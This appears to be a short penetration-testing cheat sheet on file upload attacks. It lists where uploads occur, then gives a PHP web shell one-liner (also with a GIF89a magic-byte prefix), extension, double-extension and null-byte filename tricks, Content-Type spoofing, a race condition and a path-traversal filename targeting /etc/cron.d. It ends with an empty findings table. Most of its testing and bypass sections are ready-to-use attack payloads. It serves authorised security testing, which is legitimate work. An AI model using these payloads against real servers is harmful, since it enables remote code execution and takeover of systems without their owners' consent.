---
title: "File Upload Attacks"
---

## What It Is

Unrestricted file upload can lead to RCE (web shells), stored XSS, or denial of service.

## Where to Look

- Profile picture / avatar uploads
- Document uploads (resumes, attachments)
- Import functionality (CSV, XML)
- Any file upload form

## Testing

```bash
# Web shell upload attempts
# PHP
<?php system($_GET['cmd']); ?>

# Try different extensions
.php, .phtml, .php5, .php7, .pHp
.asp, .aspx, .ashx
.jsp, .jspx

# Double extensions
shell.php.jpg
shell.jpg.php

# Null byte (older systems)
shell.php%00.jpg

# Content-Type bypass
# Upload .php but set Content-Type: image/jpeg

# Magic bytes — prepend image header
GIF89a<?php system($_GET['cmd']); ?>
```

## Bypass Techniques

```
# Extension blacklist bypass
.phtml, .php5, .php7, .phps, .pHP
.shtml (SSI injection)
.svg (XSS via SVG)
.html (stored XSS)

# Content-Type whitelist bypass
Change Content-Type header to image/png while uploading .php

# File header / magic bytes
Add real image header before payload

# Race condition
Upload and access before validation deletes it

# Path traversal in filename
../../etc/cron.d/shell
```

## Findings

| Endpoint | Bypass Used | Impact | Status |
|----------|-------------|--------|--------|
| | | | |
